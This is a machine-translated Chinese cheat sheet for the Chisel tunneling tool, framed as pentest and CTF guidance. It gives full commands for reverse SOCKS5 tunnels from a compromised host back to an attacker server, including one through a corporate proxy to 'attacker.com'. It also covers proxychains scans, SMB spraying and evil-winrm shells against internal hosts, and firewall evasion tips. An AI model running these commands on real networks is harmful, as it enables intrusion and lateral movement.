<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Chisel - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p对齐=“中心”>
  <b>⚡ 通过 HTTP 传输的快速 TCP/UDP 隧道，通过 SSH 保护，打包为单个便携式二进制文件</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [如何运作](#-how-it-works)
- [安装](#-安装)
- [架构和隧道模式](#-architecture--tunnel-modes)
- [标准渗透测试设置：反向 SOCKS5 代理](#-standard-pentest-setup-reverse-socks5-proxy)
  - [第 1 步：在攻击者上启动服务器](#step-1-start-server-on-attacker)
  - [步骤 2：从目标连接客户端](#step-2-connect-client-from-target)
  - [步骤 3：配置 Proxychains](#step-3-configure-proxychains)
  - [步骤 4：通过隧道执行工具](#step-4-execute-tools-over-the-tunnel)
- [本地端口转发](#-local-port-forwarding)
- [远程端口转发（捕获入站流量）](#-remote-port-forwarding-捕捉-inbound-traffic)
- [身份验证和指纹锁定](#-authentication--fingerprint-pinning)
- [出口规避和 HTTP 代理链接](#-egress-evasion--http-proxy-chaining)
- [Chisel vs Ligolo-ng vs SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [快速参考表](#-quick-reference-table)
- [提示和最佳实践](#-tips--best-practices)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**Chisel** 是一种用 Go 编写的开源跨平台隧道工具，它将安全的 SSH 会话封装在标准 HTTP/WebSocket 连接中。

由于流量看起来像线路上的标准 HTTP/HTTPS 或 WebSocket 通信，因此 Chisel 可以轻松地穿过限制性防火墙、深度数据包检测 (DPI) 系统和通常会阻止原始 SSH 或 VPN 流量的企业 Web 代理。

### 主要优势

- 🚀 **单个二进制文件：** 在独立的静态编译二进制文件中包含服务器和客户端。
- 🛡️ **防火墙规避：** 通过标准端口 80/443 或 WebSocket 建立隧道以融入常规 Web 流量。
- 🔒 **默认加密：** 在幕后使用 SSH 加密（ECDSA 密钥和 AES-GCM）。
- 🔄 **SOCKS5 和端口转发：** 轻松创建反向 SOCKS5 代理或特定的本地/远程转发端口。

---

## 🏗️ 它是如何运作的
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 安装

### 卡利Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### 从源头开始（转到）
```bash
go install github.com/jpillora/chisel@latest
```
### 下载预编译的二进制文件

从官方版本下载适用于 Linux、Windows 和 macOS 的独立二进制文件：
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 标准渗透测试设置：反向 SOCKS5 代理

在标准渗透测试和 CTF 中，目标计算机位于 NAT/防火墙后面，无法接受来自您的直接入站连接。您必须创建一个**反向 SOCKS5 代理**。

### 第 1 步：在攻击者上启动服务器

启动 Chisel 服务器侦听端口 `8000`（或用于规避的 `443`），并允许反向端口转发：
```bash
chisel server --reverse -p 8000 -v
```
### 步骤 2：从目标连接客户端

在受感染的计算机上执行客户端，连接回攻击者 IP 并打开反向 SOCKS5 代理：

#### Linux 目标：
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Windows 目标：
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **结果：** 攻击者计算机上的 Chisel 服务器在本地打开端口 `1080` 作为通过目标路由的 SOCKS5 代理！

### 步骤 3：配置代理链

在攻击者机器上编辑 `/etc/proxychains4.conf` （或 `/etc/proxychains.conf`）：
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### 步骤 4：通过隧道执行工具

在任何工具前面加上 `proxychains` 前缀，以将其路由到内部受感染的主机：
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 本地端口转发

将目标后面的特定内部端口直接转发到本地攻击者计算机，无需完整的 SOCKS 代理。

### 示例：访问内部 Web 服务（端口 80）

攻击者服务器（`192.168.1.100:8000`）：
```bash
chisel server --reverse -p 8000
```
目标客户：
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
现在浏览到攻击者计算机上的 `http://127.0.0.1:8080` 以查看内部 Web 服务器！

### 示例：公开内部数据库 (MySQL 3306)

目标客户：
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
直接从攻击者终端连接：
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 远程端口转发（捕获入站流量）

公开目标计算机上的端口，该端口路由回攻击者机器上的服务（对于提供有效负载或捕获回调很有用）。
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 身份验证和指纹固定

在实时环境中，开放的 Chisel 端口可能会被未经授权的各方劫持。通过身份验证保护您的隧道：

### 身份验证 (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### 指纹固定 (`--fingerprint`)

当服务器启动时，它会打印其 SSH 公钥指纹：
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
在客户端验证以防止 MITM 拦截：
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ 出口规避和 HTTP 代理链

如果内部目标只能通过身份验证公司代理访问互联网：
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs Ligolo-ng vs SSH

|特色 |凿子|利戈洛-ng | SSH 隧道 |
|--------|--------|------------|----------------|
| **主要方法** | SOCKS5 和端口转发 | TUN 接口 (VPN) | SOCKS5 和端口转发 |
| **传输协议** | HTTP/WebSocket |原始 TLS | SSH（端口 22）|
| **防火墙规避** | ⭐⭐⭐⭐⭐ 出色 | ⭐⭐⭐⭐ 非常好 | ⭐⭐ 差（22 端口通常被阻塞）|
| **需要根/管理员**| ❌ 否（仅限用户态）| ✅ 是（创建 TUN 设备）| ❌ 否 |
| **Nmap SYN 扫描 (`-sS`)**| ❌ 否 | ✅ 是的 | ❌ 否 |
| **UDP 支持** |部分（通过 SOCKS5）| ✅ 全原生 UDP | ❌ 非常有限 |

---

## 📊 快速参考表

|模式|命令 |目的|
|------|---------|---------|
| **服务器（反向）** | `chisel server --reverse -p 8000` |启动反向服务器监听 8000 |
| **客户端（反向 SOCKS5）** | `chisel client <IP>:8000 R:1080:socks` |在攻击者的端口1080上创建反向SOCKS5 |
| **客户端（转发端口）** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` |将目标的端口 80 映射到攻击者的 8080 |
| **客户端（暴露攻击者端口）** | `chisel client <IP>:8000 4444:127.0.0.1:4444` |在目标路由上向攻击者开放端口 4444 |
| **验证服务器** | `chisel server --reverse --auth "u:p" -p 8000` |需要连接客户端的凭据 |
| **身份验证客户端** | `chisel client --auth "u:p" <IP>:8000 R:socks` |使用凭证连接 |
| **保持活动调整** | `chisel client --keepalive 10s <IP>:8000 R:socks`|防止防火墙空闲会话丢失 |

---

## 💡 提示和最佳实践

1. **使用端口 443 进行最大程度的规避：**
   防火墙经常检查任意端口（如 8000 或 8080）上的流量。在端口 `443` 上运行 Chisel 服务器可确保流量看起来与 HTTPS WebSocket 相同。
2. **调整代理链超时：**
   如果代理链连接感觉缓慢，请编辑 `/etc/proxychains4.conf` 并设置：
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **目标不需要 root 权限：**
   与 VPN 或 TUN 解决方案不同，Chisel 纯粹在用户空间中运行。您可以将 `chisel.exe` 或 `chisel` 作为低权限服务帐户（`www-data`、`nobody`、标准 Windows 用户）运行。

---

## ⚠️ 法律免责声明

> **重要提示：** Chisel 用于授权网络测试、红队模拟和系统管理。在未经授权的网络上部署隧道工具违反了计算机安全法。

---

## 📚 资源

- [Chisel GitHub 存储库](https://github.com/jpillora/chisel)
- [Proxychains-NG项目](https://github.com/rofl0r/proxychains-ng)